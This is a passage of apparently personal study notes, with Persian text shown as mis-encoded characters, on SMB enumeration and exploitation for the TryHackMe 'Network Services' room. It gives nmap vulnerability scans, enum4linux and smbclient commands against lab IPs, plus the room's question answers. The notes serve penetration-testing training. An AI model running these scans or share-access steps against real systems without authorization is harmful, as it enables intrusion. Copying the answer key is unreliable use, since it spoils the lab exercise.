---
Episode: E55 to E57
Date: 2024-07-16
Is Finished?: true
Practice Primary: 
Practice Secondary: 
Time: 45:00
tags:
  - CyberSecurity
  - hacking
Category: Cyber Security
banner: 
Home: "[[Table of Content - Hacking & Security]]"
Pervious Episode: "[[E50 to E54 - (Pentesting Methodology - Part 2)]]"
Next Episode: "[[E58 to E61 - (Setup Hack The Box & Hack Some Machines)]]"
---
-------
## E55 to E57 - (SMB, Telnet & FTP Exploitation)
- [SMB Exploitation - E57](#SMB%20Exploitation%20-%20E57)
	- [Definition & Instruction](#Definition%20&%20Instruction)
		- [Whats SMB(Server Message Block)?](#Whats%20SMB(Server%20Message%20Block)?)
		- [SMB Scanning](#SMB%20Scanning)
		- [SMB Enumerating](#SMB%20Enumerating)
			- [Way 1 - `enum4linux`](#Way%201%20-%20%60enum4linux%60)
			- [Way 2 - Nmap Script `smb-os-discovery.nse`](#Way%202%20-%20Nmap%20Script%20%60smb-os-discovery.nse%60)
		- [SMB Exploitation - `smbclient`](#SMB%20Exploitation%20-%20%60smbclient%60)
	- [Practical Demo](#Practical%20Demo)
		- [TASK 1 - Get Connected](#TASK%201%20-%20Get%20Connected)
		- [TASK 2 - Understanding SMB](#TASK%202%20-%20Understanding%20SMB)
		- [TASK 3 - Enumerating SMB](#TASK%203%20-%20Enumerating%20SMB)
		- [TASK 4 - Exploitation SMB](#TASK%204%20-%20Exploitation%20SMB)
- [Telnet Exploitation - E56](#Telnet%20Exploitation%20-%20E56)
	- [Definition & Instruction](#Definition%20&%20Instruction)
		- [What is Telnet?](#What%20is%20Telnet?)
		- [Established Telnet Connection](#Established%20Telnet%20Connection)
		- [Telnet Enumeration & Scanning](#Telnet%20Enumeration%20&%20Scanning)
	- [Practical Demo](#Practical%20Demo)
		- [TASK 5 - Understanding Telnet](#TASK%205%20-%20Understanding%20Telnet)
		- [TASK 6 - Enumerating Telnet](#TASK%206%20-%20Enumerating%20Telnet)
- [FTP Exploitation - E55](#FTP%20Exploitation%20-%20E55)
	- [Definition & Instruction](#Definition%20&%20Instruction)
		- [What is FTP(File Transfer Protocol)?](#What%20is%20FTP(File%20Transfer%20Protocol)?)
		- [FTP Enumeration](#FTP%20Enumeration)
		- [FTP Exploit with `hydra` in Bruteforce](#FTP%20Exploit%20with%20%60hydra%60%20in%20Bruteforce)
	- [Practical Demo](#Practical%20Demo)
		- [TASK 8 - FTP](#TASK%208%20-%20FTP)
		- [TASK 9 - Enumerating FTP](#TASK%209%20-%20Enumerating%20FTP)
		- [TASK 10 - Exploitation FTP](#TASK%2010%20-%20Exploitation%20FTP)
-----
### THY Room Address
Ø¨Ø±Ø§ÛŒ ØªÙ…Ø±ÛŒÙ† Ù…Ø¨Ø§Ø­Ø« Ø§ÛŒÙ† Ø¬Ù„Ø³Ù‡ Ø§Ø² Ø¢Ø²Ù…Ø§ÛŒØ´Ú¯Ø§Ù‡ Try Hack Me Ùˆ Ø§ØªØ§Ù‚ Network Services Ø¨Ø§ Ø¢Ø¯Ø±Ø³ Ø²ÛŒØ± Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù…ÛŒÚ©Ù†ÛŒÙ….
- **ROOM** => **Network Services**:
	- https://tryhackme.com/room/networkservices
		- ![[Pasted image 20240716165056.png]]
### SMB Exploitation - E57
#### Definition & Instruction
##### Whats SMB?
- **SMB(Server Message Block)**: `tcp/445`
- ÛŒÚ© Ù¾Ø±ÙˆØªÚ©Ù„ Client Server Communication Ø§Ø³Øª Ú©Ù‡ Ø¨Ø±Ø§ÛŒ Ø§Ø´ØªØ±Ø§Ú© Ú¯Ø°Ø§Ø±ÛŒ ÙØ§ÛŒÙ„ Ù‡Ø§ØŒ Ù¾Ø±ÛŒÙ†ØªØ±ØŒ Ù¾ÙˆØ±Øª Ø³Ø±ÛŒØ§Ù„ Ùˆ Ø³Ø§ÛŒØ± Ù…Ù†Ø§Ø¨Ø¹(API, Named Pipes, ...) Ø¯Ø± Ø´Ø¨Ú©Ù‡ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù…ÛŒØ´ÙˆØ¯.
- Ù¾Ø±ÙˆØªÚ©Ù„ SMB ÛŒÚ© Ù¾Ø±ÙˆØªÚ©Ù„ `Response Request` Ø§Ø³Øª Ø¨Ø¯ÛŒÙ† Ù…Ø¹Ù†Ø§ Ú©Ù‡ Ø¨Ø±Ø§ÛŒ Ø¨Ø±Ù‚Ø±Ø§Ø±ÛŒ Ø§Ø±ØªØ¨Ø§Ø· Ù…ÛŒØ§Ù† Ú©Ù„Ø§ÛŒÙ†Øª Ùˆ Ø³Ø±ÙˆØ± Ú†Ù†Ø¯ÛŒÙ† Ù¾ÛŒØ§Ù… Ø¨Ø§ÛŒØ¯ Ø¯Ø± Ø¨ÛŒÙ† Ú©Ù„Ø§ÛŒÙ†Øª Ùˆ Ø³Ø±ÙˆØ± Ø¬Ø§Ø¨Ø¬Ø§ Ø´ÙˆØ¯.
- Ú©Ù„Ø§ÛŒÙ†Øª SMB Ø¨Ø± Ø¨Ø³ØªØ± `TCP/IP` Ø¨Ù‡ Ø³Ø±ÙˆØ± SMB Ù…ØªØµÙ„ Ù…ÛŒØ´ÙˆØ¯ØŒ Ø¯Ø± ÙˆØ§Ù‚Ø¹ Ø§ÛŒÙ† Ù¾Ø±ÙˆØªÚ©Ù„ Ø¨Ø± Ø¨Ø³ØªØ± `NetBIOS over TCP/IP` Ú©Ø§Ø± Ù…ÛŒÚ©Ù†Ø¯ Ø¨Ø¯ÛŒÙ† Ù…Ø¹Ù†Ø§ Ú©Ù‡ Ø§Ú¯Ø± Ø¯Ø± Scanning Ùˆ Enumerating Ø¨Ù‡ `NetBIOS` Ùˆ ÛŒØ§ `NETBEUI` ÛŒØ§ `IPX/SPX` Ø¨Ø±Ø®ÙˆØ±Ø¯ÛŒÙ… Ø¯Ø± ÙˆØ§Ù‚Ø¹ Ø¨Ù‡ Ù¾Ø±ÙˆØªÚ©Ù„ SMB Ø¨Ø±Ø®ÙˆØ±Ø¯ÛŒÙ….
	- ![[Pasted image 20240717163908.png]]
- Ù¾Ø³ Ø§Ø² Ø¨Ø±Ù‚Ø±Ø§Ø±ÛŒ Ø§Ø±ØªØ¨Ø§Ø· Ú©Ù„Ø§ÛŒÙ†Øª Ùˆ Ø³Ø±ÙˆØ± SMBØŒ Ú©Ù„Ø§ÛŒÙ†Øª Ø¨Ø§ Ø§Ø¬Ø±Ø§ÛŒ Ú©Ø§Ù…Ù†Ø¯ Ù‡Ø§ÛŒ SMB Ù…ÛŒØªÙˆØ§Ù†Ø¯ Ø¨Ù‡ ÙØ§ÛŒÙ„ Ù‡Ø§ ÛŒØ§ Ù…Ù†Ø§Ø¨Ø¹ Ø§Ø´ØªØ±Ø§Ú©ÛŒ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ú¯ÛŒØ±Ø¯.
- Ø¯Ø± Ø³ÛŒØ³ØªÙ… Ù‡Ø§ÛŒ Ù„ÛŒÙ†ÙˆÚ©Ø³ÛŒ Ø§ÛŒÙ† Ù¾Ø±ÙˆØªÚ©Ù„ `SMB` Ù†Ø§Ù… Ø¯Ø§Ø±Ø¯ Ø§Ù…Ø§ Ø¯Ø± Ø³ÛŒØ³ØªÙ… Ù‡Ø§ÛŒ ÙˆÛŒÙ†Ø¯ÙˆØ²ÛŒ Ø§ÛŒÙ† Ù¾Ø±ÙˆØªÚ©Ù„ `Samba` Ù†Ø§Ù…ÛŒØ¯Ù‡ Ù…ÛŒØ´ÙˆØ¯. 
- Ù‡Ù…Ú†Ù†ÛŒÙ† Ø¯Ø± Ù…Ø§Ø´ÛŒÙ† Ù‡Ø§ÛŒ ÙˆÛŒÙ†Ø¯ÙˆØ²ÛŒ Ø¨Ø± Ø±ÙˆÛŒ `tcp/445` Ú©Ù‡ Ù¾ÙˆØ±Øª SMB Ù…ÛŒØ¨Ø§Ø´Ø¯ØŒ Ø³Ø±ÙˆÛŒØ³ `microsoft-ds` ÙØ¹Ø§Ù„ Ø§Ø³Øª
- Ø¨Ø±Ø§ÛŒ Ù…Ø·Ø§Ù„Ø¹Ù‡ Ø¨ÛŒØ´ØªØ±  Ú©Ø§ÙÛŒØ³Øª Ø¹Ø¨Ø§Ø±Ø§Øª `RFC1001` ÛŒØ§ `RFC1002` Ø±Ø§ Ø¯Ø± Ø§ÛŒÙ†ØªØ±Ù†Øª Ø¬Ø³ØªØ¬Ùˆ Ú©Ù†ÛŒØ¯.
- *Ø§Ø³Ù„Ø§ÛŒØ¯*:
	- ![[Pasted image 20240717164211.png]]
##### SMB Scanning
Ø¨Ø±Ø§ÛŒ Ø§Ø³Ú©Ù† Ø§ÛŒÙ† Ù¾Ø±ÙˆØªÚ©Ù„ Ùˆ Ø¨Ø¯Ø³Øª Ø¢ÙˆØ±Ø¯Ù† Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø§Ø² SMB Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø§Ø² Ø§Ø³Ú©Ù†Ø± Nmap Ø¨Ø§ ÙÙ„Ú¯ Ù‡Ø§ÛŒ Ø²ÛŒØ± Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒÙ… >> 
	![[Pasted image 20240716163407.png]]
```sh 
nmap -sS -T4 10.10.15.16
```
##### SMB Enumerating
###### Way 1 - `enum4linux`
- Ø¨Ø±Ø§ÛŒ Enumerate Ú©Ø±Ø¯Ù† Ù¾Ø±ÙˆØªÚ©Ù„ SMB Ø¯Ø± ÙˆÛŒÙ†Ø¯ÙˆØ² Ùˆ Ù„ÛŒÙ†ÙˆÚ©Ø³ Ø§Ø² Ø§Ø¨Ø²Ø§Ø±ÛŒ Ø¨Ù†Ø§Ù… `enum4linux` Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù…ÛŒÚ©Ù†ÛŒÙ…. 
- Ø§ÛŒÙ† Ø§Ø¨Ø²Ø§Ø± Ø¯Ø± ÙˆØ§Ù‚Ø¹ Ù†ÙˆØ¹ÛŒ Wrapper Ø§Ø³Øª Ú©Ù‡ ØªÙ…Ø§Ù… Ø¨Ø³ØªÙ‡ Ù‡Ø§ÛŒ SAMBA Ø±Ø§ Ø¨Ø±Ù…ÛŒØ¯Ø§Ø±Ø¯ Ùˆ Ø³Ù¾Ø³ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ù…ÙÛŒØ¯ Ø¯Ø± Ù…ÙˆØ±Ø¯ ØªØ§Ø±Ú¯Øª Ø±Ø§ Ø§Ø² Ø¯Ø±ÙˆÙ† Ø§ÛŒÙ† Ø¨Ø³ØªÙ‡ Ù‡Ø§ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ù…ÛŒÚ©Ù†Ø¯. 
- Ø§ÛŒÙ† Ø§Ø¨Ø²Ø§Ø± Ø¨ØµÙˆØ±Øª Ù¾ÛŒØ´ÙØ±Ø¶ Ø¨Ø± Ø±ÙˆÛŒ KaliØŒ Parrot Ù†ØµØ¨ Ø§Ø³Øª.
*Ø§ÛŒÙ† Ø§Ø¨Ø²Ø§Ø± Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø²ÛŒØ± Ø±Ø§ Ø§Ø² ØªØ§Ø±Ú¯Øª Ø¨Ø¯Ø³Øª Ù…ÛŒ Ø¢ÙˆØ±Ø¯*:
- Target Machine Usernames
	- ![[Pasted image 20240716171829.png]]
- Workgroups and Domain Names
	- ![[Pasted image 20240716171840.png]]
- Target Shares
	- ![[Pasted image 20240716171917.png]]
*Ø¨Ø±Ø§ÛŒ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² Ø§ÛŒÙ† Ø§Ø¨Ø²Ø§Ø± Ø¨Ù‡ Ø´Ú©Ù„ Ø²ÛŒØ± Ø¹Ù…Ù„ Ù…ÛŒÚ©Ù†ÛŒÙ…:*
```sh
enum4linux -a 10.10.50.26
#------#------#
-a => 'Get all information about target'
```
- *Ø§Ø³Ù„Ø§ÛŒØ¯*
	![[Pasted image 20240716164229.png]]
###### Way 2 - Nmap Script `smb-os-discovery.nse`
- Ø¨Ø±Ø§ÛŒ Enumerate Ú©Ø±Ø¯Ù† Ù¾Ø±ÙˆØªÚ©Ù„ SMB Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø§Ø² Ø§Ø³Ú©Ø±ÛŒÙ¾Øª Nmap Ø¨Ù‡ Ù†Ø§Ù… `smb-os-discovery` Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒÙ…. Ø§ÛŒÙ† Ø§Ø³Ú©Ø±ÛŒÙ¾Øª Ù…ÛŒØªÙˆØ§Ù†Ø¯ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø²ÛŒØ± Ø±Ø§ Ø§Ø² Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ú©Ù†Ø¯:
	- Open Ports
	- Target OS
	- Computer Name
	- Computer NetBIOS
	- Domain Name & FQDN
	- System Time
		- ![[Pasted image 20240716172854.png]]
```sh
sudo nmap --script smb-os-discovery.nse 10.10.50.26
```
	![[Pasted image 20240716164637.png]]
Ø§ÛŒÙ† Ø§Ø³Ú©Ø±ÛŒÙ¾Øª Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ú©Ø§Ù…Ù„ÛŒ Ø±Ø§ Ø§Ø² OS ØªØ§Ø±Ú¯Øª Ùˆ Ù‡Ù…Ú†Ù†ÛŒÙ† Ù¾Ø±ÙˆØªÚ©Ù„ SMB Ø´Ø§Ù…Ù„ `NetBIOS` Ø±Ø§ Ø¨Ø±Ø§ÛŒ Ù…Ø§ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ù…ÛŒÚ©Ù†Ø¯:
	![[Pasted image 20240716164623.png]]
##### SMB Exploitation - `smbclient`
Ø¨Ø±Ø§ÛŒ Ú¯Ø±ÙØªÙ† Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø³Ø±ÙˆØ± SMB Ùˆ ÙØ§ÛŒÙ„ Ù‡Ø§ÛŒ Ø§Ø´ØªØ±Ø§Ú©ÛŒ Ùˆ ÛŒØ§ Ø³Ø§ÛŒØ± Ù…Ù†Ø§Ø¨Ø¹ Ø§Ø´ØªØ±Ø§Ú© Ú¯Ø°Ø§Ø±ÛŒ Ø´Ø¯Ù‡ØŒ Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø§Ø² `smbclient` Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒÙ…ØŒ Ù‡Ù†Ú¯Ø§Ù…ÛŒÚ©Ù‡ Ø¨Ø§ `smbclient` Ø¨Ù‡ Ø³Ø±ÙˆØ± Ù…ØªØµÙ„ Ù…ÛŒØ´ÙˆÛŒÙ… Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… ØªÙ…Ø§Ù… Ú©Ø§Ù…Ù†Ø¯Ù‡Ø§ÛŒ SMB Ø±Ø§ Ø¨Ø± Ø±ÙˆÛŒ Ø³Ø±ÙˆØ± Ø§Ø¬Ø±Ø§ Ú©Ù†ÛŒÙ….
- *Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² Ø§ÛŒÙ† Ø§Ø¨Ø²Ø§Ø± Ø¨Ù‡ Ù†Ø­Ùˆ Ø²ÛŒØ± Ù…ÛŒØ¨Ø§Ø´Ø¯:*
```sh
smbclient -L 
smbclient //10.10.50.26/share "Access to share folder on 10.10.50.26"
smbclient //10.10.10.2/share -U davoodya -p 12945
#-----#-----#
-L 'Access to All Shares'
-U 'specify Username'
-p 'Specify Password'
```
	![[Pasted image 20240716164926.png]]
#### Practical Demo
##### TASK 1 - Get Connected
Ø¨Ù‡ Ø¢Ø²Ù…Ø§ÛŒØ´Ú¯Ø§Ù‡ Try Hack Me Ùˆ Ø³Ù¾Ø³ Ø±ÙˆÙ… Network Services Ù…ÛŒØ±ÙˆÛŒÙ… Ùˆ Join Room Ù…ÛŒØ´ÙˆÛŒÙ…. Ø³Ù¾Ø³ Ø¨Ø±Ø§ÛŒ Ø§Ø³ØªØ§Ø±Øª Room Ø§Ø² Kali Linux Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù…ÛŒÚ©Ù†ÛŒÙ…:
	![[Pasted image 20240716165318.png]]
Ø§ÛŒÙ† TASK 1 Ø³ÙˆØ§Ù„ Ø®Ø§ØµÛŒ Ù†Ø¯Ø§Ø±Ø¯ Ùˆ ÙÙ‚Ø· Ù…ÛŒÚ¯ÙˆÛŒØ¯ Ù…Ø§Ø´ÛŒÙ† Ø±Ø§ Ø±ÙˆØ´Ù† Ú©Ù†ÛŒØ¯ Ùˆ Ø¨Ù‡ Ø¢Ù† Ù…ØªØµÙ„ Ø´ÙˆÛŒØ¯.
##### TASK 2 - Understanding SMB
0. *TASK 2 - Q_&_A*
	1. *Ø³ÙˆØ§Ù„ Ø§ÙˆÙ„*:
		1. What does SMB stand for? `server message block`
	2. *Ø³ÙˆØ§Ù„ Ø¯ÙˆÙ…*:
		1. What Type of Protocol is SMB? `response-request`
	3. *Ø³ÙˆØ§Ù„ Ø³ÙˆÙ…*:
		1. What do client connect to server using? `tcp/ip`
	4. *Ø³ÙˆØ§Ù„ Ú†Ù‡Ø§Ø±Ù…*:
		1. What systems does samba Run on? `Unix`
##### TASK 3 - Enumerating SMB
0. *Scanning using `nmap`*
	1. Ø§Ø¨ØªØ¯Ø§ Ù…Ø§Ø´ÛŒÙ† TASK3 Ø±Ø§ Start Ù…ÛŒÚ©Ù†ÛŒÙ…. Ø³Ù¾Ø³ Ø¯Ø± Ø§ÙˆÙ„ÛŒÙ† Ù‚Ø¯Ù… Ø¨Ø§ÛŒØ¯ ØªØ§Ø±Ú¯Øª Ø±Ø§ Ø¨ÙˆØ³ÛŒÙ„Ù‡ Nmap Ø§Ø³Ú©Ù† Ú©Ù†ÛŒÙ… ØªØ§ Ø¨ØªÙˆØ§Ù†ÛŒÙ… Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ù…ÙˆØ±Ø¯ Ù†ÛŒØ§Ø² Ø±Ø§ Ø§Ø² Ø§ÛŒÙ† Ù¾Ø±ÙˆØªÚ©Ù„ Ø¨ÛŒØ±ÙˆÙ† Ø¨Ú©Ø´ÛŒÙ…. Ø¨Ø±Ø§ÛŒ Ø§ÛŒÙ†Ú©Ø§Ø± Ø¢ÛŒÙ¾ÛŒ ØªØ§Ø±Ú¯Øª Ø±Ø§ Ø¨Ø¯Ù…ÛŒØ¯Ø§Ø±ÛŒÙ… Ùˆ Ø¨Ù‡ Ù…Ø§Ø´ÛŒÙ† Kali Ø¯Ø± VMWare Ù…ÛŒØ±ÙˆÛŒÙ….
	2. *Ø§Ø³Ú©Ù† Ø§ÙˆÙ„:* Ø§Ø³Ú©Ù† Ø¢Ø³ÛŒØ¨ Ù¾Ø°ÛŒØ±ÛŒ Ùˆ Ù¾ÙˆØ±Øª Ù‡Ø§
		1. `nmap -sS -p- 10.10.50.26`
		2. `sudo nmap -sS -T4 --script vuln 10.10.50.26`
	3. Ø¯Ø± Ø§ÛŒÙ† Ø§Ø³Ú©Ù† Ù…ØªÙˆØ¬Ù‡ Ø´Ø¯ÛŒÙ… Ú©Ù‡ Ø³Ù‡ Ù¾ÙˆØ±Øª `22, 139, 445` Ø¯Ø± Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø¨Ø§Ø² Ø§Ø³Øª.
	4. Ù‡Ù…Ú†Ù†ÛŒÙ† Ø³Ø±ÙˆÛŒØ³ SMB Ø¨Ø± Ø±ÙˆÛŒ Ø¯Ùˆ Ù¾ÙˆØ±Øª `139/445` ÙØ¹Ø§Ù„ Ø§Ø³Øª.
	5. Ù‡Ù…Ú†Ù†ÛŒÙ† Ù…Ø´Ø§Ù‡Ø¯Ù‡ Ú©Ø±Ø¯ÛŒÙ… Ú©Ù‡ Ù…Ø§Ø´ÛŒÙ† ÙˆÛŒÙ†Ø¯ÙˆØ²ÛŒ Ø§Ø² Ø³Ø±ÙˆÛŒØ³ `regsvc` Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù…ÛŒÚ©Ù†Ø¯ Ú©Ù‡ Ø¨Ø§ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² Ø§ÛŒÙ† Ø¢Ø³ÛŒØ¨ Ù¾Ø°ÛŒØ±ÛŒ Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø¨Ù‡ Ù…Ø§Ø´ÛŒÙ† ÙˆÛŒÙ†Ø¯ÙˆØ²ÛŒ Ø­Ù…Ù„Ù‡ DOS Ø±Ø§ Ø§Ù†Ø¬Ø§Ù… Ø¯Ù‡ÛŒÙ….
1. *Enumerating using `enum4linux`*
	1. Ø¯Ø± Ù…Ø±Ø­Ù„Ù‡ Ø¨Ø¹Ø¯ÛŒ Ø¨Ø§ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² `enum4linux` Ø³Ø¹ÛŒ Ù…ÛŒÚ©Ù†ÛŒÙ… Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø§ÛŒÙ† Ø³Ø±ÙˆÛŒØ³ Ø±Ø§ Ø§Ø² Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ú©Ù†ÛŒÙ….
	2. `enum4linux -a 10.10.50.26`
		1. ![[Pasted image 20240716171553.png]]
	3. Ø¨ÙˆØ³ÛŒÙ„Ù‡ `enum4linux` Ø§Ø·Ù„Ø§Ø¹Ø§Øª Username, Workgroup Ùˆ Share Ù‡Ø§ÛŒ Ù…Ø§Ø´ÛŒÙ† ÙˆÛŒÙ†Ø¯ÙˆØ²ÛŒ ØªØ§Ø±Ú¯Øª Ø±Ø§ Ø¨Ø¯Ø³Øª Ù…ÛŒØ§ÙˆØ±ÛŒÙ…:
		1. ![[Pasted image 20240716172106.png]]
		2. ![[Pasted image 20240716172110.png]]
		3. ![[Pasted image 20240716172116.png]]
	4. Ù†Ø§Ù… Workgroup Ùˆ Ù‡Ù…Ú†Ù†ÛŒÙ† ÛŒÚ© Profiles Ø¯Ø± Ù‚Ø³Ù…Øª Share Ø±Ø§ Ø¨Ø±Ù…ÛŒØ¯Ø§Ø±ÛŒÙ… ØªØ§ Ø¬ÙˆØ§Ø¨ Ø³ÙˆØ§Ù„Ø§Øª Ø±Ø§ Ø¨Ø¯Ù‡ÛŒÙ….
2. *Enumerating using `smb-os-discovery.nse`*
	1. Ø¨ÙˆØ³ÛŒÙ„Ù‡ Ø§ÛŒÙ† Ø§Ø³Ú©Ø±ÛŒÙ¾Øª nmap Ù‡Ù… Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… ÛŒÚ© Enumerating Ù…ÙÛŒØ¯ Ùˆ Ù…Ø®ØªØµØ± Ø§Ø² Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø§Ù†Ø¬Ø§Ù… Ø¯Ù‡ÛŒÙ….
	2. `sudo nmap --script smb-os-discovery.nse 10.10.50.26`
	3. Ø¯Ø± Ù†ØªÛŒØ¬Ù‡ Ø§Ø³Ú©Ù†ØŒ Computer NameØŒ OS Version Ùˆ Ù‡Ù…Ú†Ù†ÛŒÙ† NetBIOS ØªØ§Ø±Ú¯Øª ÙˆÛŒÙ†Ø¯ÙˆØ²ÛŒ Ø±Ø§ Ø¨Ø¯Ø³Øª Ø¢ÙˆØ±Ø¯ÛŒÙ….
	4. Ù†Ø§Ù… Ú©Ø§Ù…Ù¾ÛŒÙˆØªØ±ØŒ ÙˆØ±Ú˜Ù† Ø³ÛŒØ³ØªÙ… Ø¹Ø§Ù…Ù„ Ø±Ø§ Ø¨Ø± Ù…ÛŒØ¯Ø§Ø±ÛŒÙ… ØªØ§ Ø¬ÙˆØ§Ø¨ Ø³ÙˆØ§Ù„Ø§Øª TASK Ø±Ø§ Ø¨Ø¯Ù‡ÛŒÙ….
3. *TASK 3 - Q_&_A*
	1. *Ø³ÙˆØ§Ù„ Ø§ÙˆÙ„*:
		1. Conduct nmap scanning, How many ports open? `3`
	2. *Ø³ÙˆØ§Ù„ Ø¯ÙˆÙ…*:
		1. Whats Ports SMB running on? `139/445`
	3. *Ø³ÙˆØ§Ù„ Ø³ÙˆÙ…*:
		1. Conduct enumerate using enum4linux, what is the workgroup name of target? `WORKGROUP`
	4. *Ø³ÙˆØ§Ù„ Ú†Ù‡Ø§Ø±Ù…*:
		1. Whats Computer Name? `POLOSMB`
	5. *Ø³ÙˆØ§Ù„ Ù¾Ù†Ø¬Ù…*:
		1. Whats Operation System version is running? `6.1`
	6. *Ø³ÙˆØ§Ù„ Ø´Ø´Ù…*:
		1. Whats Share sticks out as standing we might want to investigate? `profiles`
		2. Ù‡Ù†Ú¯Ø§Ù… Enumerate Ø¨Ø§ enum4liunx Ø¯Ø± Share Ù‡Ø§ÛŒ ØªØ§Ø±Ú¯Øª Ø¨Ù‡ Ú†Ù‡ Ú†ÛŒØ²ÛŒ Ø¨Ø±Ø®ÙˆØ±Ø¯ÛŒØ¯ Ú©Ù‡ Ø§Ø­ØªÙ…Ø§Ù„ Ù…ÛŒØ¯Ù‡ÛŒØ¯ Ø¨ØªÙˆØ§Ù† Ø§Ø² Ø¢Ù† Ø¨Ø±Ø§ÛŒ ØªØ­Ù‚ÛŒÙ‚Ø§Øª Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ø±Ø¯ØŸ `profiles`
-----
```sh
sudo nmap -sS -T4 --script vuln 10.10.50.26 #Vulnerability scanning
enum4linux -a 10.10.50.26
sudo nmap --script smb-os-discovery.nse 10.10.50.26
```
##### TASK 4 - Exploitation SMB
0. *Exploitation Shares(profiles)*
	1. Ø­Ø§Ù„ Ú©Ù‡ Share Ù‡Ø§ÛŒ Ø¯Ø±ÙˆÙ† Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø±Ø§ Ø¨Ø¯Ø³Øª Ø¢ÙˆØ±Ø¯ÛŒÙ… Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø¨Ù‡Ø±Ù‡ Ø¨Ø±Ø¯Ø§Ø±ÛŒ Ø±Ø§ Ø´Ø±ÙˆØ¹ Ú©Ù†ÛŒÙ… Ùˆ Ø¨Ø§ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² `smbclient` Ø¨Ù‡ Share Ù‡Ø§ÛŒ ØªØ§Ø±Ú¯Øª Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ú¯ÛŒØ±ÛŒÙ…. Ø¯Ø± Ø§ÛŒÙ†Ø¬Ø§ Ù…ÛŒØ®ÙˆØ§Ù‡ÛŒÙ… Ø¨Ù‡ Share Ø¨Ù†Ø§Ù… `profiles` Ú©Ù‡ Ø¯Ø± Ù…Ø±Ø­Ù„Ù‡ Enumerate Ø¨ÙˆØ³ÛŒÙ„Ù‡ `enum4linux` Ø¨Ø¯Ø³Øª Ø¢ÙˆØ±Ø¯ÛŒÙ…ØŒ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ú¯ÛŒØ±ÛŒÙ….
	2. `smbclient //10.10.10.2/profiles` Leave Password as Blank
		1. ![[Pasted image 20240716174741.png]]
	3. *SMB Commands*:
		1. Ø­Ø§Ù„ Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ú©Ø§Ù…Ù†Ø¯ Ù‡Ø§ÛŒ SMB Ø±Ø§ Ø¯Ø± Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø§Ø¬Ø±Ø§ Ú©Ù†ÛŒÙ….
		2. `ls`
			1. Ú©Ø§Ù…Ù†Ø¯ Ø±Ø§ Ø§Ø¬Ø±Ø§ Ù…ÛŒÚ©Ù†ÛŒÙ… ØªØ§ Ø¨Ø¨ÛŒÙ†ÛŒÙ… ÙØ§ÛŒÙ„ Ù…Ù‡Ù…ÛŒ Ù‡Ø³Øª Ú©Ù‡ Ø¨ØªÙˆØ§Ù†ÛŒÙ… Ø§Ø² Ø¢Ù† Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒÙ…. 
			2. ÛŒÚ© ÙØ§ÛŒÙ„ Ø¨Ù†Ø§Ù… `Working From Home Information.txt` ÙˆØ¬ÙˆØ¯ Ø¯Ø§Ø±Ø¯ Ú©Ù‡ Ø¨Ù‡ Ù†Ø¸Ø± Ù…ÛŒØ±Ø³Ø¯ ÙØ§ÛŒÙ„ÛŒ Ù…Ù‡Ù… Ùˆ Ø¬Ø§Ù„Ø¨ Ø§Ø³Øª.
		3. `cat Working From Home Information.txt`
			1. Ø§ÛŒÙ† ÙØ§ÛŒÙ„ Ø±Ø§ Ù†Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø¨ÙˆØ³ÛŒÙ„Ù‡ CAT Ø¨Ø§Ø² Ú©Ù†ÛŒÙ… Ùˆ Ø¨Ø±Ø§ÛŒ Ø¨Ø§Ø² Ú©Ø±Ø¯Ù† Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø§Ø² `more` Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒÙ….
		4. `more Working From Home Information.txt`
